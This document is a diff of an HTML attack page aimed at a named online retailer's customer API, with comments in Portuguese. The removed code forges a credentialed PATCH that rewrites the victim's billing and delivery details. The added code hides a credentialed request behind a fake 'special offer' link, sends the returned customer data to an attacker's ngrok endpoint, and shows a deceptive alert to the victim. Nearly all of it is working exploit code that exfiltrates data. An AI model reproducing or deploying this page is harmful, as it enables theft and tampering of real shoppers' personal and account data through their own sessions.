@@ -1,41 +1,28 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <a href="#" id="maliciousLink">Clique aqui para uma oferta especial da Boozt!</a>
     <script>
-        fetch("https://www.boozt.com/de/de/api/customer", {
-            method: "PATCH",
-            credentials: "include", // Envia o PHPSESSID da vítima
-            headers: {
-                "Content-Type": "application/json",
-                "X-Requested-With": "XMLHttpRequest"
-            },
-            body: JSON.stringify({
-                "requisites": {
-                    "billing_firstname": "Hacked",
-                    "billing_lastname": "ByMe",
-                    "billing_street": "EvilStreet",
-                    "billing_postcode": "666",
-                    "billing_city": "Hell",
-                    "billing_country": "pt",
-                    "delivery_firstname": "Hacked",
-                    "delivery_lastname": "ByMe",
-                    "delivery_street": "EvilStreet",
-                    "delivery_postcode": "666",
-                    "delivery_city": "Hell",
-                    "delivery_country": "pt",
-                    "delivery_as_billing": true
+        document.getElementById("maliciousLink").addEventListener("click", function(e) {
+            e.preventDefault(); // Evita redirecionamento
+            fetch("https://www.boozt.com/de/de/api/customer", {
+                method: "GET", // Teste GET primeiro; se não funcionar, tente PATCH
+                credentials: "include", // Envia o PHPSESSID
+                headers: {
+                    "X-Requested-With": "XMLHttpRequest"
                 }
             })
-        })
-        .then(response => response.json())
-        .then(data => {
-            // Redireciona o resultado para o atacante
-            fetch("https://327b-2804-4580-1080-7db-e5f3-62e8-de0e-c67e.ngrok-free.app", {
-                method: "POST",
-                body: JSON.stringify(data)
-            });
-        })
-        .catch(error => console.error("Erro:", error));
+            .then(response => response.json())
+            .then(data => {
+                // Envia os dados sensíveis para o ngrok
+                fetch("https://327b-2804-4580-1080-7db-e5f3-62e8-de0e-c67e.ngrok-free.app/capture", {
+                    method: "POST",
+                    body: JSON.stringify(data)
+                });
+                alert("Oferta ativada!"); // Engana a vítima
+            })
+            .catch(error => console.error("Erro:", error));
+        });
     </script>
 </body>
 </html>
